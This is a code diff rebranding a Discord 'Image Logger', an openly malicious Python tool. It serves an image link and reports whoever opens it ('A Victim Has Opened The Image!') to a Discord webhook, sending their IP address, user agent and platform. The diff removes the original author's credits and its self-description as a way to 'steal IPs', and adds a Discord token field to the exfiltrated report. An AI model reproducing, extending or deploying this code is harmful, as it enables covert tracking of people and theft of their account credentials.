@@ -1,14 +1,11 @@
-# Image Logger
-# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "C00lB0i"
+__app__ = "KaisanSokohara - Image Dragger"
+__description__ = "I couldn't care less."
+__version__ = "v1.0 BETA"
+__author__ = "KaisanSokohara"
 
 config = {
     # BASE CONFIG #
@@ -18,7 +15,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "KaisanSokohara", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "I couldn't care less.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -80,7 +77,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "KaisanSokohara - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -99,7 +96,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "KaisanSokohara - Link Sent",
             "color": config["color"],
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
@@ -143,8 +140,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "username": config["username"],
     "content": ping,
     "embeds": [
-        {
-            "title": "KaisanSokohara - DRAGGER",
+        {        
+            "title": "KaisanSokohara - Dragger",
             "color": config["color"],
             "description": f"""**A Victim Has Opened The Image!**
 
@@ -169,8 +166,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **Discord-T:**
 ```
-TESTHAHA
-```""
+'{discordtoken}'
+```
         
 **User Agent:**
 ```
